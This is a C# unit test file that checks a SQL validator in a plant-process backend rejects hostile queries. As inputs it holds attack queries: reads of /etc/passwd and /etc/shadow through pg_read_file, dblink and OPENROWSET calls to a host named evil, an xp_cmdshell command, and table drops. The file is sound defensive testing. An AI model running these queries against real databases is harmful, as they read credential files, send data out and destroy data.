// ============================================================
// File:    Backend/tests/PlantProcess.Application.UnitTests/Security/SafeSqlPolicyTests.cs
// Task:    BE-FIX-002 (SafeSqlValidator hardening) — tests
//
// Adversarial test set proving the hardened validator blocks the
// specific patterns we care about: function exfiltration, system
// schemas, all join styles, missing LIMIT on WITH RECURSIVE.
// ============================================================

using PlantProcess.Application.Integration.Security;
using Xunit;

namespace PlantProcess.Application.UnitTests.Security;

public class SafeSqlPolicyTests
{
    // ───────────────────────────────────────────────────────────
    // PostgreSQL dangerous functions
    // ───────────────────────────────────────────────────────────

    [Theory]
    [InlineData("SELECT pg_read_file('/etc/passwd', 0, 1000)")]
    [InlineData("SELECT pg_read_binary_file('/etc/shadow')")]
    [InlineData("SELECT pg_ls_dir('/')")]
    [InlineData("SELECT pg_stat_file('/var/log/postgres')")]
    [InlineData("SELECT dblink('host=evil.com user=admin', 'select 1')")]
    [InlineData("SELECT lo_export(1, '/tmp/x')")]
    [InlineData("SELECT lo_import('/tmp/y')")]
    [InlineData("SELECT pg_sleep(60)")]
    [InlineData("SELECT pg_sleep_for('1 minute')")]
    public void Validate_blocks_dangerous_pg_functions(string sql)
    {
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
        Assert.NotEmpty(result.Errors);
    }

    // ───────────────────────────────────────────────────────────
    // System schemas
    // ───────────────────────────────────────────────────────────

    [Theory]
    [InlineData("SELECT * FROM pg_catalog.pg_authid")]
    [InlineData("SELECT * FROM information_schema.tables")]
    [InlineData("SELECT * FROM pg_catalog.pg_proc")]
    public void Validate_blocks_system_schemas(string sql)
    {
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
    }

    // ───────────────────────────────────────────────────────────
    // SQL Server dangerous functions
    // ───────────────────────────────────────────────────────────

    [Theory]
    [InlineData("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=evil;...', 'SELECT 1')")]
    [InlineData("SELECT * FROM OPENQUERY(srv, 'SELECT 1')")]
    [InlineData("EXEC xp_cmdshell 'whoami'")]
    [InlineData("WAITFOR DELAY '0:0:10'")]
    public void Validate_blocks_mssql_dangerous_constructs(string sql)
    {
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
    }

    // ───────────────────────────────────────────────────────────
    // DML / DDL
    // ───────────────────────────────────────────────────────────

    [Theory]
    [InlineData("UPDATE staging_records SET payload = '{}'")]
    [InlineData("DELETE FROM material_units")]
    [InlineData("DROP TABLE staging_records")]
    [InlineData("ALTER TABLE staging_records ADD COLUMN evil text")]
    [InlineData("TRUNCATE quality_events")]
    [InlineData("INSERT INTO defect_catalog VALUES ('X','x','x')")]
    public void Validate_blocks_dml_and_ddl(string sql)
    {
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
    }

    // ───────────────────────────────────────────────────────────
    // All JOIN styles
    // ───────────────────────────────────────────────────────────

    [Theory]
    [InlineData("SELECT * FROM \"secret_table\"")]
    [InlineData("SELECT * FROM `secret_table`")]
    [InlineData("SELECT * FROM staging_records CROSS JOIN secret_table")]
    [InlineData("SELECT * FROM staging_records NATURAL JOIN secret_table")]
    [InlineData("SELECT * FROM staging_records INNER JOIN secret_table ON 1=1")]
    [InlineData("SELECT * FROM staging_records LEFT OUTER JOIN secret_table ON 1=1")]
    [InlineData("SELECT * FROM staging_records FULL OUTER JOIN secret_table ON 1=1")]
    [InlineData("SELECT * FROM staging_records, secret_table")]
    [InlineData("SELECT * FROM staging_records s, secret_table t")]
    public void Validate_catches_all_join_styles(string sql)
    {
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Contains("secret_table"));
    }

    // ───────────────────────────────────────────────────────────
    // WITH RECURSIVE
    // ───────────────────────────────────────────────────────────

    [Fact]
    public void Validate_requires_LIMIT_on_WITH_RECURSIVE()
    {
        var sql = @"
            WITH RECURSIVE t AS (
                SELECT 1 AS n
                UNION ALL
                SELECT n+1 FROM t WHERE n < 999999999
            )
            SELECT * FROM t";
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
        Assert.Contains(result.Errors, e => e.Contains("LIMIT", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void Validate_accepts_WITH_RECURSIVE_with_LIMIT()
    {
        var sql = @"
            WITH RECURSIVE t AS (
                SELECT 1 AS n
                UNION ALL
                SELECT n+1 FROM t WHERE n < 100
            )
            SELECT * FROM t LIMIT 1000";
        var result = SafeSqlValidator.Validate(sql);
        Assert.True(result.IsValid, string.Join("; ", result.Errors));
    }

    // ───────────────────────────────────────────────────────────
    // Multiple statements
    // ───────────────────────────────────────────────────────────

    [Theory]
    [InlineData("SELECT * FROM staging_records; SELECT * FROM material_units")]
    [InlineData("SELECT 1; DROP TABLE material_units")]
    public void Validate_blocks_multiple_statements(string sql)
    {
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
    }

    // ───────────────────────────────────────────────────────────
    // Happy path — valid queries should pass
    // ───────────────────────────────────────────────────────────

    [Theory]
    [InlineData("SELECT * FROM staging_records LIMIT 100")]
    [InlineData("SELECT * FROM material_units WHERE site_id = '00000000-0000-0000-0000-000000000001'")]
    [InlineData("SELECT m.material_code, q.event_type FROM material_units m JOIN quality_events q ON m.id = q.material_unit_id")]
    public void Validate_accepts_well_formed_queries(string sql)
    {
        var result = SafeSqlValidator.Validate(sql);
        Assert.True(result.IsValid, string.Join("; ", result.Errors));
    }

    // ───────────────────────────────────────────────────────────
    // Whitespace and comments are stripped before token analysis
    // ───────────────────────────────────────────────────────────

    [Fact]
    public void Validate_strips_block_comments_before_token_check()
    {
        var sql = "/* SELECT pg_read_file */ SELECT * FROM staging_records LIMIT 10";
        var result = SafeSqlValidator.Validate(sql);
        Assert.True(result.IsValid, string.Join("; ", result.Errors));
    }

    [Fact]
    public void Validate_strips_line_comments_before_token_check()
    {
        var sql = "SELECT * FROM staging_records -- pg_read_file\nLIMIT 10";
        var result = SafeSqlValidator.Validate(sql);
        Assert.True(result.IsValid, string.Join("; ", result.Errors));
    }

    // ───────────────────────────────────────────────────────────
    // But a forbidden token in the actual query is still caught
    // even after comment stripping
    // ───────────────────────────────────────────────────────────

    [Fact]
    public void Validate_still_blocks_real_pg_read_file_call()
    {
        var sql = "/* harmless comment */ SELECT pg_read_file('/etc/passwd')";
        var result = SafeSqlValidator.Validate(sql);
        Assert.False(result.IsValid);
    }
}
